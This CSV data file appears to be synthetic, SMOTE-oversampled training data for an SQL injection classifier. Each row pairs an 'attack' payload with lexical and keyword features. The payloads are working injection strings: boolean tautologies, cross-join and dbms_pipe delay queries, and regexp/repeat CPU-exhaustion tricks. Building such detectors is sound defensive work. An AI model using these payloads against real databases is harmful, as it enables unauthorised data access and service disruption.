id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000324,0.27054987808579356,120.56174934486226,29.0,4.047635181515056,65.0,8.0,33.96812445405189,13.593624890810379,0.5402164110901712,0.06648817367263646,0.28065038967954287,0.11264502555764955,0.0,0.0,2.0,0.0,1.0,1.0,0.0,4.593624890810378,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,boolean,"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",nearest_attack_euclidean,R000963,0.8170645720954903,205.2673205901399,33.06660721907819,3.7118960891416086,122.75547629210425,12.0,52.33392780921808,18.17791648881755,0.6018031966662839,0.05876725490144673,0.2515209432618424,0.087908605170427,0.0,4.0,0.0,0.0,1.0,1.3111309269739362,0.0,5.866785561843616,0.0,0.0,6.0,2.311130926973936,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000003,attack,boolean,-4351'  )   or 6525  =  9458,nearest_attack_euclidean,R001098,0.12446556927607061,29.589350933566593,14.733546584723053,3.23850773696779,2.366773292361529,12.489031056482034,10.489031056482034,4.244515528241015,0.07760535742072255,0.42388559092221045,0.3552259235590861,0.14328312809798086,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.1222577641205094,0.0,0.0,0.1222577641205087,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000004,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001168,0.10382552555656857,264.9128556511879,38.0,3.8104504025441255,80.11362568516367,37.0,104.11362568516367,43.68560428086061,0.3023308426160492,0.13974245383518308,0.39297459645508687,0.1649521070936808,1.0,0.0,2.0,0.0,0.0,2.0,0.0,22.68560428086061,0.0,1.9999999999999998,4.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000005,attack,boolean,"-9313%""  )   or 5971  =  4572#",nearest_attack_euclidean,R000642,0.10873828923415564,29.939413863478975,16.0,3.4602748958153935,2.0,12.0,10.0,5.939413863478997,0.0668059451414276,0.40083567084856553,0.33402972570713796,0.1983286583028689,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.9394138634789962,0.0,0.0,1.9999999999999996,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000006,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000487,0.7611795033268725,193.5257687475991,33.67673080374292,3.742188135000165,55.32326919625708,24.969807588771236,78.58615357005664,34.64653839251416,0.28610995378775084,0.12893046587784776,0.4058911199708909,0.17906846036351048,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.646538392514156,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.3232691962570786,0.6767308037429214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000007,attack,boolean,"1""   )    )    as ihfw where 3949  =  3949 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000491,0.4920046284508073,157.58671878206695,35.36953125458099,3.872813593314703,46.73906250916198,23.0,61.478125018323965,26.36953125458099,0.29662751181792435,0.1464191168904851,0.38954146970126075,0.1674119015903298,0.0,0.7898437515269973,2.0,0.0,0.0,2.0,0.0,11.579687503053995,0.0,1.9999999999999998,1.0,10.0,0.0,0.7898437515269973,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000151,0.6489914370785238,196.01649676179827,29.548453956690594,3.6290601663853015,119.2742269783453,12.0,47.193815826762375,17.548453956690594,0.6088073425827148,0.06125678245602002,0.24046693336087108,0.08946894160039404,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.548453956690593,0.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.2742269783452964,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000009,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000008,0.25505192722232484,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.44963443067962383,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000010,attack,boolean,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'nlky' like 'nlky",nearest_attack_euclidean,R000690,0.8987139830341883,289.3711864159151,36.31440679204247,3.608788758618207,85.05677962387259,28.371186415915055,126.62881358408494,49.31440679204247,0.2939241386393002,0.09803495754973456,0.43761478030387135,0.17042612350709385,4.0,0.0,0.0,0.0,0.0,1.3144067920424718,0.0,28.0,0.0,1.9999999999999998,4.0,11.314406792042472,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.3144067920424718,0.6855932079575282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
